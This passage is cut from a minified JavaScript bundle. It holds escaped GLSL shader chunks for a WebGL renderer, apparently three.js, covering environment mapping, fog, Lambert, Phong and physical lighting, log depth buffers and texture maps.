) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvarying vec3 vWorldPosition;\\n\\t#else\\n\\t\\tvarying vec3 vReflect;\\n\\t\\tuniform float refractionRatio;\\n\\t#endif\\n#endif\\n\",envmap_physical_pars_fragment:\"#if defined( USE_ENVMAP ) && defined( PHYSICAL )\\n\\tvec3 getLightProbeIndirectIrradiance( const in GeometricContext geometry, const in int maxMIPLevel ) {\\n\\t\\tvec3 worldNormal = inverseTransformDirection( geometry.normal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\t\\tvec3 queryVec = vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = textureCubeLodEXT( envMap, queryVec, float( maxMIPLevel ) );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = textureCube( envMap, queryVec, float( maxMIPLevel ) );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_CUBE_UV )\\n\\t\\t\\tvec3 queryVec = vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\\n\\t\\t\\tvec4 envMapColor = textureCubeUV( envMap, queryVec, 1.0 );\\n\\t\\t#else\\n\\t\\t\\tvec4 envMapColor = vec4( 0.0 );\\n\\t\\t#endif\\n\\t\\treturn PI * envMapColor.rgb * envMapIntensity;\\n\\t}\\n\\tfloat getSpecularMIPLevel( const in float blinnShininessExponent, const in int maxMIPLevel ) {\\n\\t\\tfloat maxMIPLevelScalar = float( maxMIPLevel );\\n\\t\\tfloat desiredMIPLevel = maxMIPLevelScalar + 0.79248 - 0.5 * log2( pow2( blinnShininessExponent ) + 1.0 );\\n\\t\\treturn clamp( desiredMIPLevel, 0.0, maxMIPLevelScalar );\\n\\t}\\n\\tvec3 getLightProbeIndirectRadiance( const in GeometricContext geometry, const in float blinnShininessExponent, const in int maxMIPLevel ) {\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvec3 reflectVec = reflect( -geometry.viewDir, geometry.normal );\\n\\t\\t#else\\n\\t\\t\\tvec3 reflectVec = refract( -geometry.viewDir, geometry.normal, refractionRatio );\\n\\t\\t#endif\\n\\t\\treflectVec = inverseTransformDirection( reflectVec, viewMatrix );\\n\\t\\tfloat specularMIPLevel = getSpecularMIPLevel( blinnShininessExponent, maxMIPLevel );\\n\\t\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\t\\tvec3 queryReflectVec = vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = textureCubeLodEXT( envMap, queryReflectVec, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = textureCube( envMap, queryReflectVec, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_CUBE_UV )\\n\\t\\t\\tvec3 queryReflectVec = vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\\n\\t\\t\\tvec4 envMapColor = textureCubeUV( envMap, queryReflectVec, BlinnExponentToGGXRoughness(blinnShininessExponent ));\\n\\t\\t#elif defined( ENVMAP_TYPE_EQUIREC )\\n\\t\\t\\tvec2 sampleUV;\\n\\t\\t\\tsampleUV.y = asin( clamp( reflectVec.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;\\n\\t\\t\\tsampleUV.x = atan( reflectVec.z, reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = texture2DLodEXT( envMap, sampleUV, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = texture2D( envMap, sampleUV, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_SPHERE )\\n\\t\\t\\tvec3 reflectView = normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0,0.0,1.0 ) );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = texture2DLodEXT( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#endif\\n\\t\\treturn envMapColor.rgb * envMapIntensity;\\n\\t}\\n#endif\\n\", envmap_vertex:\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvWorldPosition = worldPosition.xyz;\\n\\t#else\\n\\t\\tvec3 cameraToVertex = normalize( worldPosition.xyz - cameraPosition );\\n\\t\\tvec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvReflect = reflect( cameraToVertex, worldNormal );\\n\\t\\t#else\\n\\t\\t\\tvReflect = refract( cameraToVertex, worldNormal, refractionRatio );\\n\\t\\t#endif\\n\\t#endif\\n#endif\\n\", fog_vertex:\"\\n#ifdef USE_FOG\\nfogDepth = -mvPosition.z;\\n#endif\",fog_pars_vertex:\"#ifdef USE_FOG\\n varying float fogDepth;\\n#endif\\n\",fog_fragment:\"#ifdef USE_FOG\\n\\t#ifdef FOG_EXP2\\n\\t\\tfloat fogFactor = whiteCompliment( exp2( - fogDensity * fogDensity * fogDepth * fogDepth * LOG2 ) );\\n\\t#else\\n\\t\\tfloat fogFactor = smoothstep( fogNear, fogFar, fogDepth );\\n\\t#endif\\n\\tgl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );\\n#endif\\n\",fog_pars_fragment:\"#ifdef USE_FOG\\n\\tuniform vec3 fogColor;\\n\\tvarying float fogDepth;\\n\\t#ifdef FOG_EXP2\\n\\t\\tuniform float fogDensity;\\n\\t#else\\n\\t\\tuniform float fogNear;\\n\\t\\tuniform float fogFar;\\n\\t#endif\\n#endif\\n\", gradientmap_pars_fragment:\"#ifdef TOON\\n\\tuniform sampler2D gradientMap;\\n\\tvec3 getGradientIrradiance( vec3 normal, vec3 lightDirection ) {\\n\\t\\tfloat dotNL = dot( normal, lightDirection );\\n\\t\\tvec2 coord = vec2( dotNL * 0.5 + 0.5, 0.0 );\\n\\t\\t#ifdef USE_GRADIENTMAP\\n\\t\\t\\treturn texture2D( gradientMap, coord ).rgb;\\n\\t\\t#else\\n\\t\\t\\treturn ( coord.x < 0.7 ) ? vec3( 0.7 ) : vec3( 1.0 );\\n\\t\\t#endif\\n\\t}\\n#endif\\n\",lightmap_fragment:\"#ifdef USE_LIGHTMAP\\n\\treflectedLight.indirectDiffuse += PI * texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\\n#endif\\n\", lightmap_pars_fragment:\"#ifdef USE_LIGHTMAP\\n\\tuniform sampler2D lightMap;\\n\\tuniform float lightMapIntensity;\\n#endif\",lights_lambert_vertex:\"vec3 diffuse = vec3( 1.0 );\\nGeometricContext geometry;\\ngeometry.position = mvPosition.xyz;\\ngeometry.normal = normalize( transformedNormal );\\ngeometry.viewDir = normalize( -mvPosition.xyz );\\nGeometricContext backGeometry;\\nbackGeometry.position = geometry.position;\\nbackGeometry.normal = -geometry.normal;\\nbackGeometry.viewDir = geometry.viewDir;\\nvLightFront = vec3( 0.0 );\\n#ifdef DOUBLE_SIDED\\n\\tvLightBack = vec3( 0.0 );\\n#endif\\nIncidentLight directLight;\\nfloat dotNL;\\nvec3 directLightColor_Diffuse;\\n#if NUM_POINT_LIGHTS > 0\\n\\t#pragma unroll_loop\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tgetPointDirectLightIrradiance( pointLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_SPOT_LIGHTS > 0\\n\\t#pragma unroll_loop\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tgetSpotDirectLightIrradiance( spotLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_DIR_LIGHTS > 0\\n\\t#pragma unroll_loop\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tgetDirectionalDirectLightIrradiance( directionalLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_HEMI_LIGHTS > 0\\n\\t#pragma unroll_loop\\n\\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\\n\\t\\tvLightFront += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += getHemisphereLightIrradiance( hemisphereLights[ i ], backGeometry );\\n\\t\\t#endif\\n\\t}\\n#endif\\n\", lights_pars_begin:\"uniform vec3 ambientLightColor;\\nvec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {\\n\\tvec3 irradiance = ambientLightColor;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treturn irradiance;\\n}\\n#if NUM_DIR_LIGHTS > 0\\n\\tstruct DirectionalLight {\\n\\t\\tvec3 direction;\\n\\t\\tvec3 color;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];\\n\\tvoid getDirectionalDirectLightIrradiance( const in DirectionalLight directionalLight, const in GeometricContext geometry, out IncidentLight directLight ) {\\n\\t\\tdirectLight.color = directionalLight.color;\\n\\t\\tdirectLight.direction = directionalLight.direction;\\n\\t\\tdirectLight.visible = true;\\n\\t}\\n#endif\\n#if NUM_POINT_LIGHTS > 0\\n\\tstruct PointLight {\\n\\t\\tvec3 position;\\n\\t\\tvec3 color;\\n\\t\\tfloat distance;\\n\\t\\tfloat decay;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t\\tfloat shadowCameraNear;\\n\\t\\tfloat shadowCameraFar;\\n\\t};\\n\\tuniform PointLight pointLights[ NUM_POINT_LIGHTS ];\\n\\tvoid getPointDirectLightIrradiance( const in PointLight pointLight, const in GeometricContext geometry, out IncidentLight directLight ) {\\n\\t\\tvec3 lVector = pointLight.position - geometry.position;\\n\\t\\tdirectLight.direction = normalize( lVector );\\n\\t\\tfloat lightDistance = length( lVector );\\n\\t\\tdirectLight.color = pointLight.color;\\n\\t\\tdirectLight.color *= punctualLightIntensityToIrradianceFactor( lightDistance, pointLight.distance, pointLight.decay );\\n\\t\\tdirectLight.visible = ( directLight.color != vec3( 0.0 ) );\\n\\t}\\n#endif\\n#if NUM_SPOT_LIGHTS > 0\\n\\tstruct SpotLight {\\n\\t\\tvec3 position;\\n\\t\\tvec3 direction;\\n\\t\\tvec3 color;\\n\\t\\tfloat distance;\\n\\t\\tfloat decay;\\n\\t\\tfloat coneCos;\\n\\t\\tfloat penumbraCos;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];\\n\\tvoid getSpotDirectLightIrradiance( const in SpotLight spotLight, const in GeometricContext geometry, out IncidentLight directLight ) {\\n\\t\\tvec3 lVector = spotLight.position - geometry.position;\\n\\t\\tdirectLight.direction = normalize( lVector );\\n\\t\\tfloat lightDistance = length( lVector );\\n\\t\\tfloat angleCos = dot( directLight.direction, spotLight.direction );\\n\\t\\tif ( angleCos > spotLight.coneCos ) {\\n\\t\\t\\tfloat spotEffect = smoothstep( spotLight.coneCos, spotLight.penumbraCos, angleCos );\\n\\t\\t\\tdirectLight.color = spotLight.color;\\n\\t\\t\\tdirectLight.color *= spotEffect * punctualLightIntensityToIrradianceFactor( lightDistance, spotLight.distance, spotLight.decay );\\n\\t\\t\\tdirectLight.visible = true;\\n\\t\\t} else {\\n\\t\\t\\tdirectLight.color = vec3( 0.0 );\\n\\t\\t\\tdirectLight.visible = false;\\n\\t\\t}\\n\\t}\\n#endif\\n#if NUM_RECT_AREA_LIGHTS > 0\\n\\tstruct RectAreaLight {\\n\\t\\tvec3 color;\\n\\t\\tvec3 position;\\n\\t\\tvec3 halfWidth;\\n\\t\\tvec3 halfHeight;\\n\\t};\\n\\tuniform sampler2D ltc_1;\\tuniform sampler2D ltc_2;\\n\\tuniform RectAreaLight rectAreaLights[ NUM_RECT_AREA_LIGHTS ];\\n#endif\\n#if NUM_HEMI_LIGHTS > 0\\n\\tstruct HemisphereLight {\\n\\t\\tvec3 direction;\\n\\t\\tvec3 skyColor;\\n\\t\\tvec3 groundColor;\\n\\t};\\n\\tuniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];\\n\\tvec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in GeometricContext geometry ) {\\n\\t\\tfloat dotNL = dot( geometry.normal, hemiLight.direction );\\n\\t\\tfloat hemiDiffuseWeight = 0.5 * dotNL + 0.5;\\n\\t\\tvec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );\\n\\t\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\t\\tirradiance *= PI;\\n\\t\\t#endif\\n\\t\\treturn irradiance;\\n\\t}\\n#endif\\n\", lights_phong_fragment:\"BlinnPhongMaterial material;\\nmaterial.diffuseColor = diffuseColor.rgb;\\nmaterial.specularColor = specular;\\nmaterial.specularShininess = shininess;\\nmaterial.specularStrength = specularStrength;\\n\",lights_phong_pars_fragment:\"varying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\nstruct BlinnPhongMaterial {\\n\\tvec3\\tdiffuseColor;\\n\\tvec3\\tspecularColor;\\n\\tfloat\\tspecularShininess;\\n\\tfloat\\tspecularStrength;\\n};\\nvoid RE_Direct_BlinnPhong( const in IncidentLight directLight, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\\n\\t#ifdef TOON\\n\\t\\tvec3 irradiance = getGradientIrradiance( geometry.normal, directLight.direction ) * directLight.color;\\n\\t#else\\n\\t\\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\\n\\t\\tvec3 irradiance = dotNL * directLight.color;\\n\\t#endif\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n\\treflectedLight.directSpecular += irradiance * BRDF_Specular_BlinnPhong( directLight, geometry, material.specularColor, material.specularShininess ) * material.specularStrength;\\n}\\nvoid RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n}\\n#define RE_Direct\\t\\t\\t\\tRE_Direct_BlinnPhong\\n#define RE_IndirectDiffuse\\t\\tRE_IndirectDiffuse_BlinnPhong\\n#define Material_LightProbeLOD( material )\\t(0)\\n\", lights_physical_fragment:\"PhysicalMaterial material;\\nmaterial.diffuseColor = diffuseColor.rgb * ( 1.0 - metalnessFactor );\\nmaterial.specularRoughness = clamp( roughnessFactor, 0.04, 1.0 );\\n#ifdef STANDARD\\n\\tmaterial.specularColor = mix( vec3( DEFAULT_SPECULAR_COEFFICIENT ), diffuseColor.rgb, metalnessFactor );\\n#else\\n\\tmaterial.specularColor = mix( vec3( MAXIMUM_SPECULAR_COEFFICIENT * pow2( reflectivity ) ), diffuseColor.rgb, metalnessFactor );\\n\\tmaterial.clearCoat = saturate( clearCoat );\\tmaterial.clearCoatRoughness = clamp( clearCoatRoughness, 0.04, 1.0 );\\n#endif\\n\", lights_physical_pars_fragment:\"struct PhysicalMaterial {\\n\\tvec3\\tdiffuseColor;\\n\\tfloat\\tspecularRoughness;\\n\\tvec3\\tspecularColor;\\n\\t#ifndef STANDARD\\n\\t\\tfloat clearCoat;\\n\\t\\tfloat clearCoatRoughness;\\n\\t#endif\\n};\\n#define MAXIMUM_SPECULAR_COEFFICIENT 0.16\\n#define DEFAULT_SPECULAR_COEFFICIENT 0.04\\nfloat clearCoatDHRApprox( const in float roughness, const in float dotNL ) {\\n\\treturn DEFAULT_SPECULAR_COEFFICIENT + ( 1.0 - DEFAULT_SPECULAR_COEFFICIENT ) * ( pow( 1.0 - dotNL, 5.0 ) * pow( 1.0 - roughness, 2.0 ) );\\n}\\n#if NUM_RECT_AREA_LIGHTS > 0\\n\\tvoid RE_Direct_RectArea_Physical( const in RectAreaLight rectAreaLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\t\\tvec3 normal = geometry.normal;\\n\\t\\tvec3 viewDir = geometry.viewDir;\\n\\t\\tvec3 position = geometry.position;\\n\\t\\tvec3 lightPos = rectAreaLight.position;\\n\\t\\tvec3 halfWidth = rectAreaLight.halfWidth;\\n\\t\\tvec3 halfHeight = rectAreaLight.halfHeight;\\n\\t\\tvec3 lightColor = rectAreaLight.color;\\n\\t\\tfloat roughness = material.specularRoughness;\\n\\t\\tvec3 rectCoords[ 4 ];\\n\\t\\trectCoords[ 0 ] = lightPos - halfWidth - halfHeight;\\t\\trectCoords[ 1 ] = lightPos + halfWidth - halfHeight;\\n\\t\\trectCoords[ 2 ] = lightPos + halfWidth + halfHeight;\\n\\t\\trectCoords[ 3 ] = lightPos - halfWidth + halfHeight;\\n\\t\\tvec2 uv = LTC_Uv( normal, viewDir, roughness );\\n\\t\\tvec4 t1 = texture2D( ltc_1, uv );\\n\\t\\tvec4 t2 = texture2D( ltc_2, uv );\\n\\t\\tmat3 mInv = mat3(\\n\\t\\t\\tvec3( t1.x, 0, t1.y ),\\n\\t\\t\\tvec3( 0, 1, 0 ),\\n\\t\\t\\tvec3( t1.z, 0, t1.w )\\n\\t\\t);\\n\\t\\tvec3 fresnel = ( material.specularColor * t2.x + ( vec3( 1.0 ) - material.specularColor ) * t2.y );\\n\\t\\treflectedLight.directSpecular += lightColor * fresnel * LTC_Evaluate( normal, viewDir, position, mInv, rectCoords );\\n\\t\\treflectedLight.directDiffuse += lightColor * material.diffuseColor * LTC_Evaluate( normal, viewDir, position, mat3( 1.0 ), rectCoords );\\n\\t}\\n#endif\\nvoid RE_Direct_Physical( const in IncidentLight directLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\\n\\tvec3 irradiance = dotNL * directLight.color;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\t#ifndef STANDARD\\n\\t\\tfloat clearCoatDHR = material.clearCoat * clearCoatDHRApprox( material.clearCoatRoughness, dotNL );\\n\\t#else\\n\\t\\tfloat clearCoatDHR = 0.0;\\n\\t#endif\\n\\treflectedLight.directSpecular += ( 1.0 - clearCoatDHR ) * irradiance * BRDF_Specular_GGX( directLight, geometry, material.specularColor, material.specularRoughness );\\n\\treflectedLight.directDiffuse += ( 1.0 - clearCoatDHR ) * irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n\\t#ifndef STANDARD\\n\\t\\treflectedLight.directSpecular += irradiance * material.clearCoat * BRDF_Specular_GGX( directLight, geometry, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearCoatRoughness );\\n\\t#endif\\n}\\nvoid RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n}\\nvoid RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 clearCoatRadiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\t#ifndef STANDARD\\n\\t\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\t\\tfloat dotNL = dotNV;\\n\\t\\tfloat clearCoatDHR = material.clearCoat * clearCoatDHRApprox( material.clearCoatRoughness, dotNL );\\n\\t#else\\n\\t\\tfloat clearCoatDHR = 0.0;\\n\\t#endif\\n\\treflectedLight.indirectSpecular += ( 1.0 - clearCoatDHR ) * radiance * BRDF_Specular_GGX_Environment( geometry, material.specularColor, material.specularRoughness );\\n\\t#ifndef STANDARD\\n\\t\\treflectedLight.indirectSpecular += clearCoatRadiance * material.clearCoat * BRDF_Specular_GGX_Environment( geometry, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearCoatRoughness );\\n\\t#endif\\n}\\n#define RE_Direct\\t\\t\\t\\tRE_Direct_Physical\\n#define RE_Direct_RectArea\\t\\tRE_Direct_RectArea_Physical\\n#define RE_IndirectDiffuse\\t\\tRE_IndirectDiffuse_Physical\\n#define RE_IndirectSpecular\\t\\tRE_IndirectSpecular_Physical\\n#define Material_BlinnShininessExponent( material ) GGXRoughnessToBlinnExponent( material.specularRoughness )\\n#define Material_ClearCoat_BlinnShininessExponent( material ) GGXRoughnessToBlinnExponent( material.clearCoatRoughness )\\nfloat computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {\\n\\treturn saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );\\n}\\n\", lights_fragment_begin:\"\\nGeometricContext geometry;\\ngeometry.position = - vViewPosition;\\ngeometry.normal = normal;\\ngeometry.viewDir = normalize( vViewPosition );\\nIncidentLight directLight;\\n#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tPointLight pointLight;\\n\\t#pragma unroll_loop\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tpointLight = pointLights[ i ];\\n\\t\\tgetPointDirectLightIrradiance( pointLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( pointLight.shadow, directLight.visible ) ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ], pointLight.shadowCameraNear, pointLight.shadowCameraFar ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tSpotLight spotLight;\\n\\t#pragma unroll_loop\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tspotLight = spotLights[ i ];\\n\\t\\tgetSpotDirectLightIrradiance( spotLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( spotLight.shadow, directLight.visible ) ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tDirectionalLight directionalLight;\\n\\t#pragma unroll_loop\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tdirectionalLight = directionalLights[ i ];\\n\\t\\tgetDirectionalDirectLightIrradiance( directionalLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( directionalLight.shadow, directLight.visible ) ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if ( NUM_RECT_AREA_LIGHTS > 0 ) && defined( RE_Direct_RectArea )\\n\\tRectAreaLight rectAreaLight;\\n\\t#pragma unroll_loop\\n\\tfor ( int i = 0; i < NUM_RECT_AREA_LIGHTS; i ++ ) {\\n\\t\\trectAreaLight = rectAreaLights[ i ];\\n\\t\\tRE_Direct_RectArea( rectAreaLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if defined( RE_IndirectDiffuse )\\n\\tvec3 irradiance = getAmbientLightIrradiance( ambientLightColor );\\n\\t#if ( NUM_HEMI_LIGHTS > 0 )\\n\\t\\t#pragma unroll_loop\\n\\t\\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\\n\\t\\t\\tirradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\\n\\t\\t}\\n\\t#endif\\n#endif\\n#if defined( RE_IndirectSpecular )\\n\\tvec3 radiance = vec3( 0.0 );\\n\\tvec3 clearCoatRadiance = vec3( 0.0 );\\n#endif\\n\", lights_fragment_maps:\"#if defined( RE_IndirectDiffuse )\\n\\t#ifdef USE_LIGHTMAP\\n\\t\\tvec3 lightMapIrradiance = texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\\n\\t\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\t\\tlightMapIrradiance *= PI;\\n\\t\\t#endif\\n\\t\\tirradiance += lightMapIrradiance;\\n\\t#endif\\n\\t#if defined( USE_ENVMAP ) && defined( PHYSICAL ) && defined( ENVMAP_TYPE_CUBE_UV )\\n\\t\\tirradiance += getLightProbeIndirectIrradiance( geometry, maxMipLevel );\\n\\t#endif\\n#endif\\n#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )\\n\\tradiance += getLightProbeIndirectRadiance( geometry, Material_BlinnShininessExponent( material ), maxMipLevel );\\n\\t#ifndef STANDARD\\n\\t\\tclearCoatRadiance += getLightProbeIndirectRadiance( geometry, Material_ClearCoat_BlinnShininessExponent( material ), maxMipLevel );\\n\\t#endif\\n#endif\\n\", lights_fragment_end:\"#if defined( RE_IndirectDiffuse )\\n\\tRE_IndirectDiffuse( irradiance, geometry, material, reflectedLight );\\n#endif\\n#if defined( RE_IndirectSpecular )\\n\\tRE_IndirectSpecular( radiance, clearCoatRadiance, geometry, material, reflectedLight );\\n#endif\\n\",logdepthbuf_fragment:\"#if defined( USE_LOGDEPTHBUF ) && defined( USE_LOGDEPTHBUF_EXT )\\n\\tgl_FragDepthEXT = log2( vFragDepth ) * logDepthBufFC * 0.5;\\n#endif\",logdepthbuf_pars_fragment:\"#ifdef USE_LOGDEPTHBUF\\n\\tuniform float logDepthBufFC;\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvarying float vFragDepth;\\n\\t#endif\\n#endif\\n\", logdepthbuf_pars_vertex:\"#ifdef USE_LOGDEPTHBUF\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvarying float vFragDepth;\\n\\t#endif\\n\\tuniform float logDepthBufFC;\\n#endif\",logdepthbuf_vertex:\"#ifdef USE_LOGDEPTHBUF\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvFragDepth = 1.0 + gl_Position.w;\\n\\t#else\\n\\t\\tgl_Position.z = log2( max( EPSILON, gl_Position.w + 1.0 ) ) * logDepthBufFC - 1.0;\\n\\t\\tgl_Position.z *= gl_Position.w;\\n\\t#endif\\n#endif\\n\",map_fragment:\"#ifdef USE_MAP\\n\\tvec4 texelColor = texture2D( map, vUv );\\n\\ttexelColor = mapTexelToLinear( texelColor );\\n\\tdiffuseColor *= texelColor;\\n#endif\\n\", map_pars_fragment:\"#ifdef USE_MAP\\n\\tuniform sampler2D 